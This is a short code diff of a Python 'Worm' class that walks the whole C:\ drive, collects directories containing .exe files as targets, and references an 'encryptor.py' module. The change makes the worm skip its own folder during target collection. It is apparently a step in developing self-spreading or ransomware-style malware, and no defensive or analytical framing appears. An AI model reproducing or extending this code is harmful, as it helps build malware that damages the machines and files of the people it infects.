@@ -10,6 +10,7 @@ from os import system
 
 
 ROOTDIR = r"C:\\"
+THIS_DIR = os.path.dirname(os.path.realpath(__file__))
 ENCRYPTOR_PATH = os.path.join(sys.path[0], "encryptor.py")
 
 class Worm:
@@ -22,13 +23,14 @@ class Worm:
         for dirpath, dirnames, _ in os.walk(ROOTDIR):
             for dirname in dirnames:
                 directory_path = os.path.join(dirpath, dirname)
-                try:
-                    for f in os.listdir(directory_path):
-                        if f.endswith(".exe"):
-                            self.target_dir_list.append(directory_path)
-                            break
-                except PermissionError:
-                    pass
+                if directory_path != THIS_DIR:
+                    try:
+                        for f in os.listdir(directory_path):
+                            if f.endswith(".exe"):
+                                self.target_dir_list.append(directory_path)
+                                break
+                    except PermissionError:
+                        pass
 
         self.directories_found = True
 
